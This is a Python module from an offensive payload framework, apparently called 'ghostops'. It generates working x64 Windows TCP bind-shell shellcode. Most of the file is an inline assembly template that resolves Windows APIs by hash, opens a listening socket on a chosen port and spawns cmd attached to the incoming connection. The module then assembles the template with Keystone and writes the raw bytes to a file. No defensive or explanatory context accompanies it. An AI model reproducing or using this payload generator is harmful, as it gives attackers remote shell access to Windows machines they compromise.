from pathlib import Path
from keystone import KsError, Ks, KS_ARCH_X86, KS_MODE_64
from ghostops.common.utils import Logger, HexConvert
from ghostops.core.base_module import BaseModule


class WindowsX64ShellBindTcp(BaseModule):
    name = "WindowsX64ShellBindTcp"
    description = "Generates TCP bind shell payload for x64 Windows system."
    author = "Awagat Dhungana <4w4647@gmail.com>"
    category = "payload"
    os = ["windows"]
    arch = ["x64"]

    @staticmethod
    def register_arguments(parser):
        parser.add_argument("--port", required=True, type=int, help="port number")
        parser.add_argument(
            "--output",
            required=True,
            type=str,
            help="Output filename for raw shellcode (e.g., ghostops.bin)",
        )

    @staticmethod
    def run(args):
        Logger.log("info", f"PORT - {args.port}")
        print()

        try:
            port_hex = HexConvert.port_to_hex(args.port)
        except Exception:
            Logger.log("flaw", "Invalid host or port provided.")
            return

        shellcode_template = f"""
cld
and    rsp,0xfffffffffffffff0
call   0xca
push   r9
push   r8
push   rdx
push   rcx
push   rsi
xor    rdx,rdx
mov    rdx,QWORD PTR gs:[rdx+0x60]
mov    rdx,QWORD PTR [rdx+0x18]
mov    rdx,QWORD PTR [rdx+0x20]
mov    rsi,QWORD PTR [rdx+0x50]
movzx  rcx,WORD PTR [rdx+0x4a]
xor    r9,r9
xor    rax,rax
lods   al,BYTE PTR ds:[rsi]
cmp    al,0x61
jl     0x37
sub    al,0x20
ror    r9d,0xd
add    r9d,eax
loop   0x2d
push   rdx
push   r9
mov    rdx,QWORD PTR [rdx+0x20]
mov    eax,DWORD PTR [rdx+0x3c]
add    rax,rdx
mov    eax,DWORD PTR [rax+0x88]
test   rax,rax
je     0xbf
add    rax,rdx
push   rax
mov    ecx,DWORD PTR [rax+0x18]
mov    r8d,DWORD PTR [rax+0x20]
add    r8,rdx
jrcxz  0xbe
dec    rcx
mov    esi,DWORD PTR [r8+rcx*4]
add    rsi,rdx
xor    r9,r9
xor    rax,rax
lods   al,BYTE PTR ds:[rsi]
ror    r9d,0xd
add    r9d,eax
cmp    al,ah
jne    0x75
add    r9,QWORD PTR [rsp+0x8]
cmp    r9d,r10d
jne    0x66
pop    rax
mov    r8d,DWORD PTR [rax+0x24]
add    r8,rdx
mov    cx,WORD PTR [r8+rcx*2]
mov    r8d,DWORD PTR [rax+0x1c]
add    r8,rdx
mov    eax,DWORD PTR [r8+rcx*4]
add    rax,rdx
pop    r8
pop    r8
pop    rsi
pop    rcx
pop    rdx
pop    r8
pop    r9
pop    r10
sub    rsp,0x20
push   r10
jmp    rax
pop    rax
pop    r9
pop    rdx
mov    rdx,QWORD PTR [rdx]
jmp    0x21
pop    rbp
movabs r14,0x32335f327377
push   r14
mov    r14,rsp
sub    rsp,0x1a0
mov    r13,rsp
movabs r12,0x{port_hex}0002
push   r12
mov    r12,rsp
mov    rcx,r14
mov    r10d,0x726774c
call   rbp
mov    rdx,r13
push   0x101
pop    rcx
mov    r10d,0x6b8029
call   rbp
push   rax
push   rax
xor    r9,r9
xor    r8,r8
inc    rax
mov    rdx,rax
inc    rax
mov    rcx,rax
mov    r10d,0xe0df0fea
call   rbp
mov    rdi,rax
push   0x10
pop    r8
mov    rdx,r12
mov    rcx,rdi
mov    r10d,0x6737dbc2
call   rbp
xor    rdx,rdx
mov    rcx,rdi
mov    r10d,0xff38e9b7
call   rbp
xor    r8,r8
xor    rdx,rdx
mov    rcx,rdi
mov    r10d,0xe13bec74
call   rbp
mov    rcx,rdi
mov    rdi,rax
mov    r10d,0x614d6e75
call   rbp
add    rsp,0x2a0
movabs r8,0x646d63
push   r8
push   r8
mov    rdx,rsp
push   rdi
push   rdi
push   rdi
xor    r8,r8
push   0xd
pop    rcx
push   r8
loop   0x18e
mov    WORD PTR [rsp+0x54],0x101
lea    rax,[rsp+0x18]
mov    BYTE PTR [rax],0x68
mov    rsi,rsp
push   rsi
push   rax
push   r8
push   r8
push   r8
inc    r8
push   r8
dec    r8
mov    r9,r8
mov    rcx,r8
mov    r10d,0x863fcc79
call   rbp
xor    rdx,rdx
dec    rdx
mov    ecx,DWORD PTR [rsi]
mov    r10d,0x601d8708
call   rbp
mov    ebx,0x56a2b5f0
mov    r10d,0x9dbd95a6
call   rbp
add    rsp,0x28
cmp    al,0x6
jl     0x1f1
cmp    bl,0xe0
jne    0x1f1
mov    ebx,0x6f721347
push   0x0
pop    rcx
mov    r10d,ebx
call   rbp
        """

        try:
            ks = Ks(KS_ARCH_X86, KS_MODE_64)
            encoding, _ = ks.asm(shellcode_template)
        except KsError as e:
            Logger.log("flaw", f"Assembly failed: {e}")
            return

        shellcode_bytes = bytes(encoding)
        Logger.log("good", f"Shellcode size: {len(shellcode_bytes)} bytes")

        output_path = Path(args.output)
        try:
            with open(output_path, "wb") as f:
                f.write(shellcode_bytes)
            Logger.log("good", f"Raw shellcode written to {output_path}")
        except Exception as e:
            Logger.log("flaw", f"Failed to write shellcode to file: {e}")
